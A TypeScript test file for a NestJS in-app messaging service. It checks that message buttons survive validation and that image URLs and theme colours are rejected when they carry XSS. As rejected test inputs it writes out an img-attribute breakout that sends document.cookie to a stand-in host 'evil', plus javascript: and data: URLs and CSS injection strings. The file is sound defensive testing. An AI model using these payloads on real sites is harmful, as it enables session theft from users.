import { ValidationPipe, ArgumentMetadata, BadRequestException } from '@nestjs/common';
import { VALIDATION_PIPE_OPTIONS } from '../../../common/validation-pipe.options';
import { CreateInAppMessageDto } from './create-in-app-message.dto';
import { UpdateInAppMessageDto } from './update-in-app-message.dto';

/**
 * Buttons are the whole point of an in-app message — a modal nobody can act on
 * is a screenshot. They were being destroyed on every create and update: the
 * global pipe's `enableImplicitConversion` coerced each button object into an
 * array, so the dashboard's `{ id, text, action, style }` was persisted as
 * `[]` and the message rendered a row of blank buttons.
 *
 * The pipe is built from the application's own options rather than a local
 * copy, because a copy is exactly how this hid for so long.
 */
const pipe = new ValidationPipe(VALIDATION_PIPE_OPTIONS);

const meta = (metatype: unknown): ArgumentMetadata => ({
  type: 'body',
  metatype: metatype as ArgumentMetadata['metatype'],
  data: '',
});

describe('in-app message DTO validation through the global pipe', () => {
  const base = {
    name: 'Welcome modal',
    messageType: 'modal',
    title: 'Welcome',
  };

  it('keeps every field of every button', async () => {
    const buttons = [
      { id: 'btn_1', text: 'Get started', action: 'deep_link', actionUrl: 'myapp://home', style: 'primary' },
      { id: 'btn_2', text: 'Later', action: 'dismiss', style: 'secondary' },
    ];

    const result = (await pipe.transform(
      { ...base, buttons },
      meta(CreateInAppMessageDto),
    )) as CreateInAppMessageDto;

    expect(result.buttons).toEqual(buttons);
  });

  it('keeps buttons on the edit path too', async () => {
    // UpdateInAppMessageDto is PartialType(Create...), which carries the
    // decorators across — worth asserting rather than assuming, since an
    // edit that blanked every button would be as bad as a create that did.
    const result = (await pipe.transform(
      {
        buttons: [{ id: 'b', text: 'Buy', action: 'custom_event', actionEvent: 'purchase_tapped', style: 'text' }],
      },
      meta(UpdateInAppMessageDto),
    )) as UpdateInAppMessageDto;

    expect(result.buttons).toEqual([
      { id: 'b', text: 'Buy', action: 'custom_event', actionEvent: 'purchase_tapped', style: 'text' },
    ]);
  });

  it('rejects a button with an action it cannot perform', async () => {
    await expect(
      pipe.transform(
        { ...base, buttons: [{ id: 'b', text: 'Go', action: 'teleport', style: 'primary' }] },
        meta(CreateInAppMessageDto),
      ),
    ).rejects.toThrow();
  });

  it('rejects a button with no text', async () => {
    // A button whose label is missing is invisible chrome; the client has
    // nothing to draw. Better a 400 than a message that looks broken in
    // production.
    await expect(
      pipe.transform(
        { ...base, buttons: [{ id: 'b', action: 'dismiss', style: 'primary' }] },
        meta(CreateInAppMessageDto),
      ),
    ).rejects.toThrow();
  });

  it('leaves tags alone', async () => {
    // A string array is not coerced, so this was never broken — it is here to
    // keep the nested-type fix from being "over-applied" to primitives later.
    const result = (await pipe.transform(
      { ...base, tags: ['onboarding', 'q4'] },
      meta(CreateInAppMessageDto),
    )) as CreateInAppMessageDto;

    expect(result.tags).toEqual(['onboarding', 'q4']);
  });

  it('keeps free-form trigger conditions whole', async () => {
    const result = (await pipe.transform(
      {
        ...base,
        triggerConditions: { operator: 'and', conditions: [{ property: 'plan', op: 'eq', value: 'pro' }] },
      },
      meta(CreateInAppMessageDto),
    )) as CreateInAppMessageDto;

    expect(result.triggerConditions).toEqual({
      operator: 'and',
      conditions: [{ property: 'plan', op: 'eq', value: 'pro' }],
    });
  });
});

/**
 * `imageUrl` was `@IsString() @MaxLength(2048)` and `theme` a bare
 * `@IsObject()`, so a campaign could carry any string into either. Both reach
 * the clients in attribute position — `<img src="...">`, `style="background:
 * ..."` — which made an in-app campaign a way to run script on a customer's
 * page. The client-side escaping is the other half of this; server validation
 * is the half a client cannot forget to apply, and the half that keeps the bad
 * value out of the database.
 *
 * Every accepting case below is a value the dashboard editor really emits or
 * the dev database really holds: all 12 stored campaigns and all 12 seeded
 * themes were replayed through this pipe and none is rejected.
 */
describe('in-app message appearance validation', () => {
  const base = {
    name: 'Welcome modal',
    messageType: 'modal',
    title: 'Welcome',
  };

  const create = (over: Record<string, unknown>) =>
    pipe.transform({ ...base, ...over }, meta(CreateInAppMessageDto));

  describe('imageUrl', () => {
    it('accepts the https URLs the dev database holds', async () => {
      const result = (await create({
        imageUrl: 'https://picsum.photos/id/340/600/200',
      })) as CreateInAppMessageDto;

      expect(result.imageUrl).toBe('https://picsum.photos/id/340/600/200');
    });

    it('accepts plain http, since a self-hosted install may serve assets that way', async () => {
      const result = (await create({
        imageUrl: 'http://assets.internal/promo.png',
      })) as CreateInAppMessageDto;

      expect(result.imageUrl).toBe('http://assets.internal/promo.png');
    });

    it('rejects a value that breaks out of the src attribute', async () => {
      // The live exploit: the web SDK interpolated this into
      // `<img src="${imageUrl}">`, so the quote closed src and onerror ran.
      await expect(
        create({ imageUrl: 'x" onerror="fetch(`//evil/?c=${document.cookie}`)' }),
      ).rejects.toThrow(BadRequestException);
    });

    it('rejects a javascript: scheme', async () => {
      await expect(
        create({ imageUrl: 'javascript:alert(document.domain)' }),
      ).rejects.toThrow(BadRequestException);
    });

    it('rejects a data: URL', async () => {
      await expect(
        create({ imageUrl: 'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==' }),
      ).rejects.toThrow(BadRequestException);
    });

    it('rejects a scheme-less path, which is no longer a URL anything can fetch', async () => {
      await expect(create({ imageUrl: '/local/promo.png' })).rejects.toThrow(
        BadRequestException,
      );
    });

    it('still allows a message with no image', async () => {
      // The editor sends `imageUrl: form.imageUrl || undefined`, so an empty
      // field arrives as an absent key rather than an empty string.
      const result = (await create({})) as CreateInAppMessageDto;

      expect(result.imageUrl).toBeUndefined();
    });
  });

  describe('theme', () => {
    /** Exactly what the campaign editor's default form posts. */
    const editorTheme = {
      backgroundColor: '#ffffff',
      textColor: '#374151',
      titleColor: '#111827',
      buttonPrimaryColor: '#6366f1',
      buttonSecondaryColor: '#e5e7eb',
      overlayColor: 'rgba(0,0,0,0.5)',
      borderRadius: 16,
      animation: 'fade',
    };

    it('accepts the theme the dashboard editor posts, whole', async () => {
      const result = (await create({ theme: editorTheme })) as CreateInAppMessageDto;

      expect(result.theme).toEqual(editorTheme);
    });

    it('accepts the uppercase hex and rgba the seeded campaigns use', async () => {
      const result = (await create({
        theme: {
          backgroundColor: '#ECFDF5',
          textColor: '#065F46',
          overlayColor: 'rgba(0,0,0,0.6)',
          borderRadius: 24,
          animation: 'slide_down',
        },
      })) as CreateInAppMessageDto;

      expect(result.theme?.backgroundColor).toBe('#ECFDF5');
    });

    it('accepts three-digit hex', async () => {
      const result = (await create({
        theme: { backgroundColor: '#fff', textColor: '#111' },
      })) as CreateInAppMessageDto;

      expect(result.theme).toEqual({ backgroundColor: '#fff', textColor: '#111' });
    });

    it('rejects a colour that closes the style attribute', async () => {
      // The second half of the live exploit: unescaped into
      // `style="background:${backgroundColor}"`.
      await expect(
        create({
          theme: { backgroundColor: '#fff" onmouseover="alert(1)' },
        }),
      ).rejects.toThrow(BadRequestException);
    });

    it('rejects a colour smuggling a second CSS declaration', async () => {
      await expect(
        create({
          theme: { backgroundColor: 'red; background-image: url(//evil/pixel)' },
        }),
      ).rejects.toThrow(BadRequestException);
    });

    it('rejects a CSS url() expression', async () => {
      await expect(
        create({ theme: { overlayColor: 'url(//evil/pixel)' } }),
      ).rejects.toThrow(BadRequestException);
    });

    it('rejects a bare colour name, which nothing emits', async () => {
      await expect(create({ theme: { textColor: 'red' } })).rejects.toThrow(
        BadRequestException,
      );
    });

    it('rejects an animation the clients cannot play', async () => {
      await expect(
        create({ theme: { animation: 'explode' } }),
      ).rejects.toThrow(BadRequestException);
    });

    it('rejects a borderRadius that is not a number', async () => {
      await expect(
        create({ theme: { borderRadius: '16px; position: fixed' } }),
      ).rejects.toThrow(BadRequestException);
    });

    it('rejects an unknown theme key rather than storing it', async () => {
      // `forbidNonWhitelisted` applies to the nested DTO too, which is the
      // whole gain over `@IsObject()`: a key no client renders cannot be
      // parked in the theme waiting for one that will.
      await expect(
        create({ theme: { backgroundColor: '#fff', fontFamily: 'x' } }),
      ).rejects.toThrow(BadRequestException);
    });

    it('applies the same rules on the edit path', async () => {
      // UpdateInAppMessageDto is PartialType(Create...). If the nested
      // decorators did not carry across, every rule above would be one PATCH
      // away from bypass.
      await expect(
        pipe.transform(
          { theme: { backgroundColor: 'red; background-image: url(//evil)' } },
          meta(UpdateInAppMessageDto),
        ),
      ).rejects.toThrow(BadRequestException);

      await expect(
        pipe.transform(
          { imageUrl: 'javascript:alert(1)' },
          meta(UpdateInAppMessageDto),
        ),
      ).rejects.toThrow(BadRequestException);
    });

    it('still allows a message with no theme', async () => {
      const result = (await create({})) as CreateInAppMessageDto;

      expect(result.theme).toBeUndefined();
    });
  });
});
